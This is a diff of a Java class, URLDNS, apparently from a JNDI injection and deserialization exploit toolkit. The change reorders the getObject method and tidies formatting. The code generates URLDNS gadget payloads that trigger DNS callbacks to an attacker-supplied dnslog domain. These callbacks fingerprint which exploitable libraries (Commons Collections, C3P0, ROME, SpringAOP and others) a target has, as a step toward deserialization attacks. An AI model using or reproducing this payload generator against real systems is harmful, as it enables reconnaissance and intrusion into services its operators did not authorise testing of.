@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 
@@ -39,44 +38,9 @@ import java.util.List;
 public class URLDNS implements ObjectPayload<Object> {
     public static String[] defaultClass = new String[]{
             "CommonsCollections13567", "CommonsCollections24", "CommonsBeanutils2", "C3P0", "AspectJWeaver", "bsh",
-            "Groovy", "Becl", "Jdk7u21", "JRE8u20", "winlinux", "jackson2100","ROME","SpringAOP"};
+            "Groovy", "Becl", "Jdk7u21", "JRE8u20", "winlinux", "jackson2100", "ROME", "SpringAOP"};
 
     public static List<Object> list = new LinkedList();
-
-    public Object getObject(String command) throws Exception {
-        
-        int    sep     = command.lastIndexOf(':');
-        if (sep < 0) {
-            throw new IllegalArgumentException("Command format is: <type>:<dnslog_url>");
-        }
-
-        String tYPE = command.substring(0, sep);
-        String url  = command.substring(sep + 1);
-
-        switch (tYPE) {
-            // common 时会测试不常被黑名单禁用的类
-            case "common":
-                setList("CommonsBeanutils2", url);
-                setList("C3P0", url);
-                setList("AspectJWeaver", url);
-                setList("bsh", url);
-                setList("winlinux", url);
-                break;
-
-            // all 会测试全部类
-            case "all":
-                setList("all", url);
-                break;
-
-            case "null":
-                return getURLDNSGadget(url, null);
-            // 默认指定类
-            default:
-                setList(tYPE, url);
-        }
-
-        return list;
-    }
 
     public static Object getURLDNSGadget(String urls, String clazzName) throws Exception {
         HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
@@ -189,14 +153,14 @@ public class URLDNS implements ObjectPayload<Object> {
                 break;
             case "ROME":
                 //rome <= 1.11.1
-                Object rome1000 = getURLDNSGadget("rome1000."+dnsLog, "com.sun.syndication.feed.impl.ToStringBean");
-                Object rome1111 = getURLDNSGadget("rome1111."+dnsLog, "com.rometools.rome.feed.impl.ObjectBean");
+                Object rome1000 = getURLDNSGadget("rome1000." + dnsLog, "com.sun.syndication.feed.impl.ToStringBean");
+                Object rome1111 = getURLDNSGadget("rome1111." + dnsLog, "com.rometools.rome.feed.impl.ObjectBean");
                 list.add(rome1000);
                 list.add(rome1111);
                 break;
             case "SpringAOP":
                 //fastjon/jackson两个链的变种都需要springAOP
-                Object springAOP = getURLDNSGadget("SpringAOP."+dnsLog, "org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource");
+                Object springAOP = getURLDNSGadget("SpringAOP." + dnsLog, "org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource");
                 list.add(springAOP);
                 break;
             case "all":
@@ -209,5 +173,40 @@ public class URLDNS implements ObjectPayload<Object> {
                 list.add(hm);
                 break;
         }
+    }
+
+    public Object getObject(String command) throws Exception {
+
+        int sep = command.lastIndexOf(':');
+        if (sep < 0) {
+            throw new IllegalArgumentException("Command format is: <type>:<dnslog_url>");
+        }
+
+        String tYPE = command.substring(0, sep);
+        String url  = command.substring(sep + 1);
+
+        switch (tYPE) {
+            // common 时会测试不常被黑名单禁用的类
+            case "common":
+                setList("CommonsBeanutils2", url);
+                setList("C3P0", url);
+                setList("AspectJWeaver", url);
+                setList("bsh", url);
+                setList("winlinux", url);
+                break;
+
+            // all 会测试全部类
+            case "all":
+                setList("all", url);
+                break;
+
+            case "null":
+                return getURLDNSGadget(url, null);
+            // 默认指定类
+            default:
+                setList(tYPE, url);
+        }
+
+        return list;
     }
 }
